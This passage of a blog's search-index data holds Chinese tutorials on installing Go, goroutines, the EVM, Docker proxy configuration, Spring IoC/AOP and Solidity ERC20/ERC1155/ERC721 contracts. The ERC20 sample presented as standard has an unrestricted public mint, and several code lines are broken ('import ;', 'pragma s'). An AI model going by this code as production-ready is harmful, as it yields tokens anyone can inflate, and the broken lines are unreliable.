bin，这三个目录分别用于存放源码文件、包文件和可执行文件。\n$GOBIN表示Go可执行文件的安装位置，默认为$GOPATH/bin。\n\n接下来让我们继续安装吧：\n\nLinux\n\n配置环境变量：export GOROOT=$HOME/go\n保证在文件系统的任何地方都能调用相关文件：export PATH=$PATH:$GOROOT/bin\n配置Go项目的工作目录：export GOPATH=$HOME/Applications/Go\n在完成上述设置后，需要在终端输入source .bashrc以使这些环境变量生效。然后重启终端，输入go env来检查环境变量是否设置正确。\n\n\nWindows\n 默认安装在目录c:/go下。\n\n\n\n下载二进制包\n\nLinux\n 在安装Go之前你需要先安装相关的C工具。\n sudo apt-get install bison ed gawk gcc libc6-dev make（此处为Ubuntu的指令，你也可以需要将工具分开安装）\n 接着去官网或镜像网站下载Go的源码包到计算机中，然后将解压后的目录go通过命令移动到$GOROOT的位置。\n wget https://storage.googleapis.com/golang/go&lt;VERSION&gt;.src.tar.gztar -zxvf go&lt;VERSION&gt;.src.tar.gzsudo mv go $GOROOT\nWindows 可以在!(http://golang.org/dl/)[下载页面]下载一键安装包。\n\n\n\n安装\n\nlinux\n 下载好源码后，进入源码文件夹中进行编译：cd $GOROOT/src，然后执行./all.bash。\n\n如果编译时出现报错：Building Go cmd&#x2F;dist using &#x2F;usr&#x2F;local&#x2F;go1.* ERROR: Cannot find &#x2F;usr&#x2F;local&#x2F;go&#x2F;bin&#x2F;go1.* set $GOROOT_BOOTSTRAP to a working Go tree &gt;&#x3D; go1.*可能是因为 $GOROOT_BOOTSTRAP 变量没有设置。这个目录在安装 Go 1.5 版本及之后的版本时需要设置。\n\n\nwindows\n在完成安装包的安装后，只需要配置$GOPATH这一个环境变量就可以开始使用Go了。\n\n\n你的Go安装目录 ($GOROOT) 的文件夹结构应该如下所示：\nREADME.md, AUTHORS, CONTRIBUTORS, LICENSE\n\n/bin：包含可执行文件，如：编译器，Go工具\n/doc：包含文档模版\n/lib：包含示例程序，代码工具，本地文档等\n/misc：包含与支持Go编辑器有关的配置文件以及cgo的示例\n/os_arch：包含标准库的包的对象文件 (.a)\n/src：包含源代码构建脚本和标准库的包的完整源代码（Go是一门开源语言）\n/src/cmd：包含Go和C的编译器和命令行脚本\n\n\n安装测试\n在一个文件夹中新建test.go文件，\npackage mainimport &quot;fmt&quot;func main() &#123;   fmt.Println(&quot;Hello, World!&quot;)&#125;\n通过go命令执行以上代码输出结果如下：go run test.go\n还可以通过go build命令生成二进制文件\n\n验证安装版本\n可以通过在终端输入go version来打印Go的版本信息。\n\n\n\n在创建目录的时候，文件夹名称永远不应该包含空格，而应该使用下划线’_’或者其他一般符号代替。\n\n","categories":["Golang"]},{"title":"GOroutine","url":"/2023/05/07/Golang/go-routine/","content":"Go 语言可以通过关键字go来开启goroutine\ngoroutine是轻量级线程，goroutine的调度是由Golang运行时进行管理的\n格式：\ngo 函数名()\n\n通过go语句开启一个新的，不同的goroutine来执行一个函数。同一个程序中的所有goroutine共享一个地址空间。\n通道通道可用于两个 goroutine 之间通过传递一个指定类型的值来同步运行和通讯。操作符 &lt;- 用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。\nchan := make(chan TYPE, &#123;NUM&#125; )，channel中传输的数据类型，第二个参数是通道缓冲区容量。\n向通道传入数据，CHAN &lt;- DATA，CHAN将会接受来自DATA的数据。\n从通道中读取数据，DATA := &lt;-CHAN，由CHAN将其中的数据赋给其他变量\n控制通道的读写权限：\n\n\n通道可以设置缓冲区，通过 make 的第二个参数指定缓冲区大小：\n带缓冲区的通道允许发送端的数据发送和接收端的数据获取处于异步状态，就是说发送端发送的数据可以放在缓冲区里面，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据。\n关闭通道\nclose()\n\ngoroutine守护+panic自动重启模式\ngo func() &#123;    for &#123;        func() &#123;            defer func() &#123;                if err := recover(); err != nil &#123;                    fmt.Println(&quot;Recovered from panic:&quot;, err)                &#125;            &#125;()            fn() // 执行函数            // 模拟内部可能引发 panic 的代码            fmt.Println(&quot;Goroutine is running&quot;)            time.Sleep(1 * time.Second)            panic(&quot;Something went wrong!&quot;)        &#125;()        time.Sleep(1 * time.Second) // 等待一段时间后重启    &#125;&#125;()// 主程序继续运行select &#123;&#125; // 阻塞主程序，防止退出\n外层的for循环确保函数在panic后会被重新调用，从而实现自动重启的效果。同时不会因为执行完而退出，持续“守护”任务。\n内层的匿名函数负责执行实际的工作，并通过defer和recover机制捕获和处理panic。\n\n如果 fn() 本身是一个长期阻塞的函数，\n\n","categories":["Golang"]},{"title":"EVM 基础","url":"/2025/02/19/Solidity/evm/","content":"&#x2F;&#x2F; TODO:添加相关图片\nEVM 基础EVM类似于JVM，它是以太坊的核心。EVM的基本架构由堆栈、内存、存储、EVM字节码和燃料费组成。下面让我们逐一了解：\n栈 StackEVM是基于堆栈的，这种“LIFO”（后进先出）的数据结构使得它可以实现高效的计算。\n在EVM中，栈的大小是固定的，最大为1024个元素。每个元素长度为256位（32字节），但是每次操作只会操作栈顶的16个元素。\n内存 Memory堆栈的计算高效但是存储有限，因此EVM设计了内存对交易执行期间的数据进行存储和读取。EVM的内存是一个线性寻址存储器，可以理解为一个动态字节数组。\n它支持8 bit 或256 bit的写入（MSTORE8&#x2F;&#x2F;MSTORE），但只支持256 bit 的读取（MLOAD）。\n\n需要注意的是，内存是临时性的：交易开始时，所有位置的值均为0；交易执行期间，值进行更新；交易结束时，所有值被清除，不进行持久化存储。如果需要永久保留数据，就需要花费Gas使用EVM的存储\n\n存储 StorageEVM的账户存储是一种映射（mapping，键值对存储），每个键和值都是256 bit的数据，支持256 bit的读、写操作，并且保存在每个合约账户中，持久地保存在区块链上，直到被明确地修改。\n对存储的读取（SLOAD）和写入（SSTORE）都需要gas，且比内存操作更加昂贵。\n\n这样的设计可以防止滥用存储资源。\n\nEVM 字节码","categories":["solidity"]},{"title":"HelloOpcodes","url":"/2025/02/19/Solidity/opcode/","content":"&#x2F;&#x2F; TODO：更新EVM基础链接\nOpcode简介 Opcode 被人们称为操作码，是以太坊智能合约的基本单元。在我们使用高级语言编写的智能合约经过编译后会成为 bytecode（字节码） 。然后才能通过这些字节码在 EVM 上执行。而这些字节码中的每一个字节都对应着一个 Opcode 。 EVM 会解析并执行这些 Opcode 以实现合约逻辑。例如我们常见的如下 Opcode :\n\nSTOP：停止执行。\nPUSH1：将一个字节的数据压入堆栈。\nSWAP1: 交换栈顶的前两个元素。\n\n通过这节内容，你将理解合约中的这些 Opcode 在做什么，那我们现在开始吧。\n\n如果你对 Opcode 在执行操作后对EVM的影响还不了解，可以参考这篇文章：EVM 基础\n\n","categories":["solidity"]},{"title":"EVM中的存储规则","url":"/2023/05/05/Solidity/storage_rule/","content":"Solidity的存储规则简介以太坊设计的合约数据存储模式是经过EVM执行后，直接从KV数据库中读写。\n在传统的编程语言中，数据的访问都可以通过指针，\n","categories":["solidity"]},{"title":"Docker 代理配置","url":"/2025/09/03/docker/docker-proxy/","content":"首先，确保你处于代理环境中，这通常需要设置HTTP和HTTPS代理。请先检查你的代理配置是否能正常访问。\n1. 配置 Docker 使用代理需要在Docker的系统服务配置中进行编辑，在/etc/systemd/system/docker.service.d/http-proxy.conf中添加以下内容：\n[Service]Environment=&quot;HTTP_PROXY=http://&lt;proxy_address&gt;:&lt;proxy_port&gt;&quot;Environment=&quot;HTTPS_PROXY=http://&lt;proxy_address&gt;:&lt;proxy_port&gt;&quot;Environment=&quot;NO_PROXY=localhost,127.0.0.1,.mycompany.com&quot;\n将&lt;proxy_addreess&gt;和&lt;proxy_port&gt;替换成你实际使用的代理地址和端口。\n\n一般情况下，如果你没有显式地为Docker配置代理或其他自定义设置，docker.service.d目录默认是不存在的。\n\n2. 重新加载并重启 Docker 服务：sudo systemctl daemon-reloadsudo systemctl restart docker\n\n3. 验证配置是否生效：docker info\n在输出的System部分，可以看到 Docker 是否使用了你配置的代理。\n\n如果代理或网络连接较慢，可以尝试增加Docker的超时时间：在/etc/docker/daemon.json中添加以下内容：&#123; &quot;default-timeout&quot;: 600 &#125;然后重启Docker\n\n","categories":["Docker"],"tags":["docker","http-proxy","https-proxy","代理配置","linux","docker配置"]},{"title":"SpringAOP","url":"/2022/12/26/SprintBoot/SpringAOP/","content":"Spring AOP是Spring框架体系结构中非常重要的功能模块之一；提供了面向切面编程实现。\n\nSpring AOP的基本概念AOP的概念AOP（Aspect-Oriented Programming）即面向切面编程，相应的就是OOP，面向对象编程。在OOP中，以类作为程序的基本单位，而在AOP中则是以切面作为基本单位。  \n\n在业务处理功能中，通常都有日志记录、事务处理、异常处理等操作，如果是使用OOP可以通过封装或继承的方法实现代码重写来应用到多个业务中，但仍存在同样的代码分散到各个方法中。因此，AOP采取横向抽取机制，将分散在各个方法中的重复代码提取出来，然后在程序编译或运行阶段，再将抽取出来的代码应用到需要执行的地方。  \n\n传统的OOP是无法实现这样的横向抽取机制，因为OOP实现的是父子的纵向重用。但AOP并不是OOP的替代品，而是对OOP的一种补充，进而相辅相成。\nAOP的基本术语\n切面（Aspect）指封装横切到系统功能的类  \n连接点（Joinpoint）指程序运行中的一些时间点（如方法的调用或异常的抛出）  \n切入点（Pointcut）指那些需要处理的连接点，在Spring AOP中，所有的方法执行都是连接点，而切入点是一个描述信息，用来修饰连接点，确定哪些连接点需要被处理。  \n通知（增强处理）由切面添加到特点的连接点（满足切入点规则）的一段代码，\n引入（Introduction）允许在现有的实现类中添加自定义的方法和属性  \n目标对象（Target Object）指所有被通知的对象。\n代理（Proxy）是通知应用到目标对象后，被动态创建的对象\n织入（Weaving）\n\n","categories":["Spring Boot"],"tags":["教程"]},{"title":"SpringIoC","url":"/2022/12/01/SprintBoot/SpringIoC/","content":"简单的对Spring IoC进行介绍,要求理解控制反转的概念；它是如何消减程序的耦合问题的？\n\n基本概念下面从一个生活实例对控制反转进行解释（也称依赖注入(Dependency Injection,DI)，只是执行角度不同，是同一个概念）\n\n如果我们要吃饭，就可以有两种选择：一是自己做；另一种是下馆子。当我们要自己做时，就需要自己准备食材、进行烹饪。而下馆子只需要根据自己的需要让店家提供。控制反转的思想便包含在了上述的例子中：将执行操作交给Spring容器。由容器控制对象的创建以及查找并注入依赖的资源，而资源则集中管理，实现资源的可配置和易管理，降低了使用资源双方的依赖程度，松耦合\n\n常用注解\n在Spring框架中，仅管使用XML配置文件可以很简单地装配Bean，但对于需要配置大量的Bean时，其XML文件会过于庞大，不方便维护。  \n\n因此推荐使用注解(annotation)的方式去装配Bean\n声明Bean的注解\n@Component\n\n\n表示一个组件对象(Bean)\n作用于任何层次上\n无明确角色\n一个泛化的概念\n\n\n@Repository\n\n\n将数据访问层(Dao)的类标识为Bean\n功能与@Component相同\n\n\n@Service\n\n\n标注一个业务逻辑组件类（Service）\n功能与@Component相同\n\n\n@Controller\n\n\n用于标注一个控制器组件类（Spring MVC 的Controller）\n功能与@Component相同\n\n注入Bean的注解\n@Autowired\n\n\n可以对类成员变量、方法及构造方法进行标注，完成自动装配的工作\n消除setter getter方法\n\n\n@Resource\n\n\n与@Autowired功能一样\n区别：默认是按照名称来装配注入的，只有当找不到与名称匹配的Bean时才会按照类型来装配注入；\n@Recourse的两个属性：\nname：指定Bean实例名称\ntype：指定Bean类型\n\n\n\n\n@Qualifier\n\n\n与@Autowired注解配合使用。当@Autowired需要按照名称来装配注入时，则使用@Qualifier\n\nSpring IoC容器（ApplicationContext）负责创建和注入Bean。Spring提供使用XML配置、注解、Java配置以及groovy配置实现Bean的创建和注入。\n实例一 （基于注解的依赖注入）\n步骤：创建Web应用，导入jar包（Spring4件套、第三方依赖包和spring-aop（用于扫描注解））创建Annotation包在该包下创建DAO层在该包下创建Service层在该包下创建Controller层创建配置类创建测试类\n\nDao层代码import ;@Repository//等价于@Repository(name = &quot;theDao&quot;)public class theDao &#123;    public void save() &#123;        System.out.println(&quot;testDao save&quot;);    &#125;&#125;\nService层代码import ;@Service//相当于@Service(&quot;theService&quot;)public class theService &#123;    @Resource(name = &quot;theDao&quot;)    //相当于@Autowired，    private theDao testDao;    public void save() &#123;        System.out.println(&quot;testService save&quot;);        testDao.save();    &#125;&#125;\nController层代码import ;@Controllerpublic class theController &#123;    @Autowired    private theService testService;    public void save() &#123;        testService.save();        System.out.println(&quot;testController save&quot;);    &#125;&#125;\n配置类import ;@Configuration  //声明当前类是配置类，相当于一个XML文件@ComponentScan(&quot;annotation&quot;)    //自动扫描当前包下使用的注解，并注册为Beanpublic class Configannotation &#123;    ...&#125;\n测试类import ;public class TestAnnotation &#123;    public static void main(String[] args) &#123;        AnnotationConfigApplicationContext appCon =             new AnnotationConfigApplicationContext(Configannotation.class);        theController tc =appCon.getBean(theController.class);        tc.save();        appCon.close();    &#125;&#125;\n实例二 （Java配置）Java配置是通过@Configuration和@Bean来实现的  \n\n@Configuration声明当前类作为一个配置类@Bean注解在方法上，声明当前方法的返回值为一个Bean\n\nDao层代码import ;public class theDao &#123;    public void save() &#123;        System.out.println(&quot;testDao save&quot;);    &#125;&#125;\nService层代码import ;public class theService &#123;    theDao testDao;    public void setTestDao(theDao testDao)&#123;        this.testDao = testDao;    &#125;    public void save() &#123;        testDao.save();    &#125;&#125;\nController层代码import ;public class theController &#123;    @Autowired    theService testService;    public void setTestService(theService testService) &#123;        this.testService = testService;    &#125;    public void save() &#123;        testService.save();    &#125;&#125;\n配置类import ;@Configuration  //声明当前类是配置类，相当于一个XML文件public class Configannotation &#123;    @Bean    public theDao getTestDao() &#123;        return new theDao();    &#125;    @Bean    public theService getTestService() &#123;        theService ts = new theService();        ts.setTestDao(getTestDao());        return ts;    &#125;    @Bean    public theController getTestController() &#123;        theController ts = new theController();        ts.setTestService(getTestService());        return ts;    &#125;&#125;\n测试类import ;public class TestConfig &#123;    public static void main(String[] args) &#123;        //初始化Spring容器ApplicationContext        AnnotationConfigApplicationContext appCon =         new AnnotationConfigApplicationContext(Configannotation.class);        theController tc =appCon.getBean(theController.class);        tc.save();        appCon.close();    &#125;&#125;\n总结\n控制反转是一种通过描述（可以是xml或注解）并通过第三方产生或获取特定对象的方式。\n在Spring中实现控制反转的是IoC容器\n实现方法是依赖注入\n\n\n常用注解\n两种Bean的创建和注入：通过对比可以看出，有时候使用Java配置反而更加繁琐。\n全局配置尽量使用Java配置\n业务Bean的配置尽量使用注解配置\n\n\n\n","categories":["Spring Boot"],"tags":["教程"]},{"title":"ERC20","url":"/2023/03/12/eips/ERC20/","content":"ERC20是一种代币标准，它主要提供了两种转账方式：transfer、transferFrom。为以太坊上的代币合约提供了一个标准化的方案，也对以太坊上数字经济的实现进行了一定的规范。\n下面是ERC20的接口：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.20;interface IERC20 &#123;    function totalSupply() external view returns (uint);    function balanceOf(address account) external view returns (uint);    function transfer(address recipient, uint amount) external returns (bool);    function allowance(address owner, address spender) external view returns (uint);    function approve(address spender, uint amount) external returns (bool);    function transferFrom(        address sender,        address recipient,        uint amount    ) external returns (bool);    event Transfer(address indexed from, address indexed to, uint value);    event Approval(address indexed owner, address indexed spender, uint value);&#125;\n现在我们就一一对各个方法及事件进行介绍：\n\ntotalSupply()  代币发行总量，\nbalanceOf(address account)  对某个账户进行余额查询\ntransfer(address recipient, uint amount)  由交易发起者向另一个账户地址进行转账。\napprove(address spender, uint amount)  设置允许某个账户spender能够从发起者地址中使用的代币数量\nallowance(address owner, address spender)  查询某个地址spender可以从owner中使用的代币数量\ntransferFrom(address sender, address recipient, uint amount)  能够实现非自己账户间的代币交易。\n\n两个事件：\n\nTransfer(address indexed from, address indexed to, uint value)  在每次进行代币交易成功时会触发，描述这笔交易的发起着，接受着以及金额。\nApproval(address indexed owner, address indexed spender, uint value)  在调用approve()函数时触发，描述代币授权的拥有者，接受者以及金额\n\n除了上述的主要方法外，建议在使用ERC20时实现name decimals symbol这三个状态变量。\n他们分别代表这个代币的名称、精度、代币简称。\n下面就是一个标准的ERC20 token合约：\n// SPDX-License-Identifier: MITpragma s ^0.8.20;import &quot;./IERC20.sol&quot;;contract ERC20 is IERC20 &#123;    uint public totalSupply;    mapping(address =&gt; uint) public balanceOf;    mapping(address =&gt; mapping(address =&gt; uint)) public allowance;    string public name = &quot;Solidity by Example&quot;;    string public symbol = &quot;SOLBYEX&quot;;    uint8 public decimals = 18;    function transfer(address recipient, uint amount) external returns (bool) &#123;        balanceOf[msg.sender] -= amount;        balanceOf[recipient] += amount;        emit Transfer(msg.sender, recipient, amount);        return true;    &#125;    function approve(address spender, uint amount) external returns (bool) &#123;        allowance[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    &#125;    function transferFrom(        address sender,        address recipient,        uint amount    ) external returns (bool) &#123;        allowance[sender][msg.sender] -= amount;        balanceOf[sender] -= amount;        balanceOf[recipient] += amount;        emit Transfer(sender, recipient, amount);        return true;    &#125;    function mint(uint amount) external &#123;        balanceOf[msg.sender] += amount;        totalSupply += amount;        emit Transfer(address(0), msg.sender, amount);    &#125;    function burn(uint amount) external &#123;        balanceOf[msg.sender] -= amount;        totalSupply -= amount;        emit Transfer(msg.sender, address(0), amount);    &#125;&#125;\n函数mint、burn分别为代币增发、代币销毁的功能。\n","categories":["Ethereum"],"tags":["ERC"]},{"title":"docker","url":"/2023/07/18/docker/docker/","content":"docker简介解决应用在不同开发环境上的环境配置的麻烦————docker：系统平滑移植，容器虚拟化技术\nDocker可以将软件的原生环境复制过来，消除了协作编码时 “我的机器上可以正常工作” 的问题\n概念Docker是基于GO的云开源项目，解决运行环境和配置问题的软件容器，方便做持续集成、整体发布的容器虚拟化技术。\ndocker特点“Build， Ship and Run Any App， Anywhere”\n通过对应用的封装、发布、部署、运行等生命周期的管理，使其能够做到“一次镜像，处处运行”\n\n安全可靠  容器间的隔离不仅限于彼此，还独立于底层的基础设施。当应用出现问题时，不会波及到主机\n\n资源利用率高  容器拥有很高的兼容性，能够将应用直接迁移到另一个平台，提高了开发效率，减少了部署应用的工作量\n\n标准开放  容器基于开放式标准，能够在任何基础设施上运行。运输方式、存储方式、API接口隔离\n\n轻量化  容器的构建快速且使用更少的计算和内存，\n\n\n架构与主要功能组件docker整体采用C&#x2F;S模式，客户端主要负责发送操作指令，服务端负责接受和处理指令。客户端和服务端之间的通信方式多样\n功能组件\nDocker客户端  Docker客户端一般通过Docker command来发起请求\nDocker服务器（Docker daemon）  接受客户端发来的请求，并实现所要求的的功能，同时针对请求返回相应的结果。\nDocker容器\nDocker镜像  镜像是一个只读的模板，用来创建相应的容器。\nDocker仓库  仓库是存放镜像的地方，类似于Maven，GitHub。docker提供的官方registry————Docker Hub。仓库可分为公开仓库和私有仓库\n\n与传统虚拟机的对比虚拟机（virtual machine），可以在一种操作系统里运行另一种操作系统。\n传统虚拟机技术是通过在主操作系统上的虚拟管理系统（VMware、virtualBox）创建虚拟机（模拟各种硬件），安装操作系统，安装部署各种应用\n\n特点\n资源占用多\n冗余步骤多\n启动慢\n\n\n\nLinux容器（Linux Containers，LXC）是与系统其他部分隔离开的一系列进程，容器不是模拟一个完整的操作系统而是对进程进行隔离，将软件运行所需的所有资源打包到一个隔离的容器中，因此在开发到测试再到生产的过程中，他都具有可移植性和一致性。容器虚拟化技术不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置，整个过程更轻量，高效并保证在任何环境中能够运行\n总结：容器是在操作系统层面上实现虚拟化，容器之间共享主机的操作系统，容器作为进程在主机上运行；而虚拟机是在硬件层面上实现虚拟化，有自己的操作系统且独立于主机操作系统。\n安装Cgroup对进程资源进行限制，对资源的使用进行追踪。\n容器容器是镜像的运行实例，就如同Java语言中类与对象的关系。\n容器是一个轻量级的沙箱子，可以被启动、开始、停止、删除，每个容器之间相互隔离，保证了平台的安全。\ndocker常用指令容器生命周期管理\ndocker run\n  创建一个新的容器（并运行一个命令）\n  docker run [OPTIONS] IMAGE [COMMAND]\n  常见参数：\n\n-d：后台运行容器，将返回容器ID\n-i：以交互模式运行容器，常与-i一起使用\n-P：随机端口映射，容器内部端口随机映射到主机的端口\n-p：指定端口映射，格式主机端口:容器端口\n-t：为容器分配一个伪输入终端\n–name：为容器指定一个名称\n–net：指定容器的网络连接类型\n–link：连接到另一个容器\n–volume：绑定一个卷\n\n\ndocker start&#x2F;stop&#x2F;restart\n  start：启动一个或多个已被停止的容器\n  stop：停止一个正在运行的容器\n  restart：重启容器\n\ndocker kill\n  杀掉一个运行中的容器\n\ndocker rm\n  删除一个或多个容器\n\ndocker exec\n\n\n容器操作\ndocker ps\n\ndocker inspect\n  获取容器&#x2F;镜像的元数据。\n\ndocker attach\n\ndocker\n\n\n本地镜像管理\ndocker image tag\n\ndocker image build \n  根据Dockerfile文件构建新镜像，其中还有些常见的选项，简写为docker build\n\n-t，生成镜像的名字及标签，可以在一次构建中为一个镜像设置多个标签\n-f，指定使用的Dockerfile文件\n\n\ndocker image history\n  可以查看指定镜像的创建历史\n\ndocker image save\n\ndocker image load\n\n\n容器rootfs命令\ndocker commit\ndocker cp\n\n镜像仓库\ndocker login&#x2F;logout\ndocker pull\ndocker push\ndocker search\n\ninfo|version\ndocekr info\ndocker version\n\n\n有时候我们访问docker hub时会出现context deadline exceeded错误，这通常是因为通过代理访问时发生超时。可能是网络环境或者代理配置引起，解决方法可以通过尝试配置镜像仓库或修改代理配置：如何配置Docker代理好用的Docker镜像仓库\n\n"},{"title":"ERC1155","url":"/2023/03/12/eips/ERC1155/","content":"interface IERC1155 &#123;    function safeTransferFrom(        address from,        address to,        uint256 id,        uint256 value,        bytes calldata data    ) external;    function safeBatchTransferFrom(        address from,        address to,        uint256[] calldata ids,        uint256[] calldata values,        bytes calldata data    ) external;    function balanceOf(address owner, uint256 id) external view returns (uint256);    function balanceOfBatch(        address[] calldata owners,        uint256[] calldata ids    ) external view returns (uint256[] memory);    function setApprovalForAll(address operator, bool approved) external;    function isApprovedForAll(        address owner,        address operator    ) external view returns (bool);&#125;interface IERC1155TokenReceiver &#123;    function onERC1155Received(        address operator,        address from,        uint256 id,        uint256 value,        bytes calldata data    ) external returns (bytes4);    function onERC1155BatchReceived(        address operator,        address from,        uint256[] calldata ids,        uint256[] calldata values,        bytes calldata data    ) external returns (bytes4);&#125;\n\n// SPDX-License-Identifier: MITpragma solidity ^0.8.20;contract ERC1155 is IERC1155 &#123;    event TransferSingle(        address indexed operator,        address indexed from,        address indexed to,        uint256 id,        uint256 value    );    event TransferBatch(        address indexed operator,        address indexed from,        address indexed to,        uint256[] ids,        uint256[] values    );    event ApprovalForAll(        address indexed owner,        address indexed operator,        bool approved    );    event URI(string value, uint256 indexed id);    // owner =&gt; id =&gt; balance    mapping(address =&gt; mapping(uint256 =&gt; uint256)) public balanceOf;    // owner =&gt; operator =&gt; approved    mapping(address =&gt; mapping(address =&gt; bool)) public isApprovedForAll;    function balanceOfBatch(        address[] calldata owners,        uint256[] calldata ids    ) external view returns (uint256[] memory balances) &#123;        require(owners.length == ids.length, &quot;owners length != ids length&quot;);        balances = new uint[](owners.length);        unchecked &#123;            for (uint256 i = 0; i &lt; owners.length; i++) &#123;                balances[i] = balanceOf[owners[i]][ids[i]];            &#125;        &#125;    &#125;    function setApprovalForAll(address operator, bool approved) external &#123;        isApprovedForAll[msg.sender][operator] = approved;        emit ApprovalForAll(msg.sender, operator, approved);    &#125;    function safeTransferFrom(        address from,        address to,        uint256 id,        uint256 value,        bytes calldata data    ) external &#123;        require(            msg.sender == from || isApprovedForAll[from][msg.sender],            &quot;not approved&quot;        );        require(to != address(0), &quot;to = 0 address&quot;);        balanceOf[from][id] -= value;        balanceOf[to][id] += value;        emit TransferSingle(msg.sender, from, to, id, value);        if (to.code.length &gt; 0) &#123;            require(                IERC1155TokenReceiver(to).onERC1155Received(                    msg.sender,                    from,                    id,                    value,                    data                ) == IERC1155TokenReceiver.onERC1155Received.selector,                &quot;unsafe transfer&quot;            );        &#125;    &#125;    function safeBatchTransferFrom(        address from,        address to,        uint256[] calldata ids,        uint256[] calldata values,        bytes calldata data    ) external &#123;        require(            msg.sender == from || isApprovedForAll[from][msg.sender],            &quot;not approved&quot;        );        require(to != address(0), &quot;to = 0 address&quot;);        require(ids.length == values.length, &quot;ids length != values length&quot;);        for (uint256 i = 0; i &lt; ids.length; i++) &#123;            balanceOf[from][ids[i]] -= values[i];            balanceOf[to][ids[i]] += values[i];        &#125;        emit TransferBatch(msg.sender, from, to, ids, values);        if (to.code.length &gt; 0) &#123;            require(                IERC1155TokenReceiver(to).onERC1155BatchReceived(                    msg.sender,                    from,                    ids,                    values,                    data                ) == IERC1155TokenReceiver.onERC1155BatchReceived.selector,                &quot;unsafe transfer&quot;            );        &#125;    &#125;    // ERC165    function supportsInterface(bytes4 interfaceId) external view returns (bool) &#123;        return            interfaceId == 0x01ffc9a7 || // ERC165 Interface ID for ERC165            interfaceId == 0xd9b67a26 || // ERC165 Interface ID for ERC1155            interfaceId == 0x0e89341c; // ERC165 Interface ID for ERC1155MetadataURI    &#125;    // ERC1155 Metadata URI    function uri(uint256 id) public view virtual returns (string memory) &#123;&#125;    // Internal functions    function _mint(address to, uint256 id, uint256 value, bytes memory data) internal &#123;        require(to != address(0), &quot;to = 0 address&quot;);        balanceOf[to][id] += value;        emit TransferSingle(msg.sender, address(0), to, id, value);        if (to.code.length &gt; 0) &#123;            require(                IERC1155TokenReceiver(to).onERC1155Received(                    msg.sender,                    address(0),                    id,                    value,                    data                ) == IERC1155TokenReceiver.onERC1155Received.selector,                &quot;unsafe transfer&quot;            );        &#125;    &#125;    function _batchMint(        address to,        uint256[] calldata ids,        uint256[] calldata values,        bytes calldata data    ) internal &#123;        require(to != address(0), &quot;to = 0 address&quot;);        require(ids.length == values.length, &quot;ids length != values length&quot;);        for (uint256 i = 0; i &lt; ids.length; i++) &#123;            balanceOf[to][ids[i]] += values[i];        &#125;        emit TransferBatch(msg.sender, address(0), to, ids, values);        if (to.code.length &gt; 0) &#123;            require(                IERC1155TokenReceiver(to).onERC1155BatchReceived(                    msg.sender,                    address(0),                    ids,                    values,                    data                ) == IERC1155TokenReceiver.onERC1155BatchReceived.selector,                &quot;unsafe transfer&quot;            );        &#125;    &#125;    function _burn(address from, uint256 id, uint256 value) internal &#123;        require(from != address(0), &quot;from = 0 address&quot;);        balanceOf[from][id] -= value;        emit TransferSingle(msg.sender, from, address(0), id, value);    &#125;    function _batchBurn(        address from,        uint256[] calldata ids,        uint256[] calldata values    ) internal &#123;        require(from != address(0), &quot;from = 0 address&quot;);        require(ids.length == values.length, &quot;ids length != values length&quot;);        for (uint256 i = 0; i &lt; ids.length; i++) &#123;            balanceOf[from][ids[i]] -= values[i];        &#125;        emit TransferBatch(msg.sender, from, address(0), ids, values);    &#125;&#125;\n","categories":["Ethereum"],"tags":["ERC"]},{"title":"ERC721","url":"/2023/03/12/eips/ERC721/","content":"同ERC20一样，ERC721也是一个代币标准，此代币英文是Non-Fungible Tokens，简写为NFT，即非同质代币。\n非同质化代币是一种具有唯一识别性的代币且不可分割，他可以将某一种物体相关联起来，更广泛的应用到实际场景中。\n每个符合ERC721的智能合约必须同时符合ERC721和ERC165。\n\nERC165智能合约定义自己支持哪些接口的一种方式。\n\n下面是常见的ERC721标准：\ninterface IERC165 &#123;    function supportsInterface(bytes4 interfaceID) external view returns (bool);&#125;interface IERC721 is IERC165 &#123;    function balanceOf(address owner) external view returns (uint balance);    function ownerOf(uint tokenId) external view returns (address owner);    function safeTransferFrom(address from, address to, uint tokenId) external;    function safeTransferFrom(        address from,        address to,        uint tokenId,        bytes calldata data    ) external;    function transferFrom(address from, address to, uint tokenId) external;    function approve(address to, uint tokenId) external;    function getApproved(uint tokenId) external view returns (address operator);    function setApprovalForAll(address operator, bool _approved) external;    function isApprovedForAll(        address owner,        address operator    ) external view returns (bool);&#125;interface IERC721Receiver &#123;    function onERC721Received(        address operator,        address from,        uint tokenId,        bytes calldata data    ) external returns (bytes4);&#125;\n\n\n// SPDX-License-Identifier: MITpragma solidity ^0.8.20;contract ERC721 is IERC721 &#123;    event Transfer(address indexed from, address indexed to, uint indexed id);    event Approval(address indexed owner, address indexed spender, uint indexed id);    event ApprovalForAll(        address indexed owner,        address indexed operator,        bool approved    );    // Mapping from token ID to owner address    mapping(uint =&gt; address) internal _ownerOf;    // Mapping owner address to token count    mapping(address =&gt; uint) internal _balanceOf;    // Mapping from token ID to approved address    mapping(uint =&gt; address) internal _approvals;    // Mapping from owner to operator approvals    mapping(address =&gt; mapping(address =&gt; bool)) public isApprovedForAll;    function supportsInterface(bytes4 interfaceId) external pure returns (bool) &#123;        return            interfaceId == type(IERC721).interfaceId ||            interfaceId == type(IERC165).interfaceId;    &#125;    function ownerOf(uint id) external view returns (address owner) &#123;        owner = _ownerOf[id];        require(owner != address(0), &quot;token doesn&#x27;t exist&quot;);    &#125;    function balanceOf(address owner) external view returns (uint) &#123;        require(owner != address(0), &quot;owner = zero address&quot;);        return _balanceOf[owner];    &#125;    function setApprovalForAll(address operator, bool approved) external &#123;        isApprovedForAll[msg.sender][operator] = approved;        emit ApprovalForAll(msg.sender, operator, approved);    &#125;    function approve(address spender, uint id) external &#123;        address owner = _ownerOf[id];        require(            msg.sender == owner || isApprovedForAll[owner][msg.sender],            &quot;not authorized&quot;        );        _approvals[id] = spender;        emit Approval(owner, spender, id);    &#125;    function getApproved(uint id) external view returns (address) &#123;        require(_ownerOf[id] != address(0), &quot;token doesn&#x27;t exist&quot;);        return _approvals[id];    &#125;    function _isApprovedOrOwner(        address owner,        address spender,        uint id    ) internal view returns (bool) &#123;        return (spender == owner ||            isApprovedForAll[owner][spender] ||            spender == _approvals[id]);    &#125;    function transferFrom(address from, address to, uint id) public &#123;        require(from == _ownerOf[id], &quot;from != owner&quot;);        require(to != address(0), &quot;transfer to zero address&quot;);        